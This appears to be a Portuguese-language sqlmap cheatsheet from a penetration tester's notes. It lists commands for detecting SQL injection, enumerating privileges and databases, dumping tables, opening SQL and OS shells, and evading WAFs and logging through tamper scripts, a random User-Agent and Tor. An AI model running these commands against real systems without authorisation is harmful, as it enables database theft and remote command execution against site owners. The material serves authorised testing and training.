---
title: sqlmap cheatsheet
description: As flags do sqlmap que eu uso de verdade, do primeiro probe até a shell.
date: 2026-11-14
tags: [sqli, web, sqlmap, cheatsheet]
attack: [T1190, T1505.003]
status: finished
---

> Só em labs próprios, CTFs ou com autorização por escrito.

## Comece por um request

Um request salvo do Burp leva cookies, headers e o corpo do POST. É o jeito mais confiável de começar.

```bash
sqlmap -r req.txt -p id --batch
```

Direto de uma URL. Atenção ao `?`, sem ele o sqlmap não enxerga parâmetro:

```bash
sqlmap -u "http://target/page.php?param1=value1&param2=value2" -p param2 --dbs
```

URLs no estilo caminho: marque o ponto de injeção com `*`.

```bash
sqlmap -u "http://target/param1/value1*/param2/value2" --dbs
```

Formulários e páginas autenticadas:

```bash
sqlmap -u "$URL" --forms --crawl=2
sqlmap -u "$URL" --cookie="PHPSESSID=..."
```

## Ajuste a detecção

```bash
# o padrão é level 1, risk 1
sqlmap -r req.txt --level=3 --risk=2

# B boolean, E error, U union, S stacked, T time, Q inline
sqlmap -r req.txt --technique=BEU

# backend conhecido, pula o fingerprint
sqlmap -r req.txt --dbms=mysql
```

## Enumere

```bash
sqlmap -r req.txt --current-user --current-db --is-dba
sqlmap -r req.txt --privileges
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D "$DATABASE" --tables
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --columns
```

## Dump

```bash
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --dump

# em engagement, prove o impacto sem levar tudo
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --count
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --dump --start=1 --stop=3
```

## Shells

```bash
sqlmap -r req.txt --sql-shell
sqlmap -r req.txt -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
sqlmap -r req.txt --os-shell
```

O `--os-shell` no MySQL precisa do privilégio `FILE`, de uma pasta gravável no webroot e do caminho dela. Confira `--is-dba` e `--privileges` antes.

## Evasão e roteamento

```bash
# veja cada request no Burp
sqlmap -r req.txt --proxy=http://127.0.0.1:8080

# WAF no caminho
sqlmap -r req.txt --tamper=space2comment,between --random-agent

# só em CTF ou pesquisa
sqlmap -r req.txt --tor --tor-type=SOCKS5 --check-tor
```

## Housekeeping

```bash
# o sqlmap guarda resultados por alvo, comece do zero
sqlmap -r req.txt --flush-session
```

## Notas

- O User-Agent padrão diz `sqlmap`. Use `--random-agent` ou defina o seu.
- Em engagement, o tráfego deve sair dos IPs de origem combinados. Tor quebra isso.
- O `req.txt` guarda tokens de sessão. Mantenha fora do git e apague ao terminar.
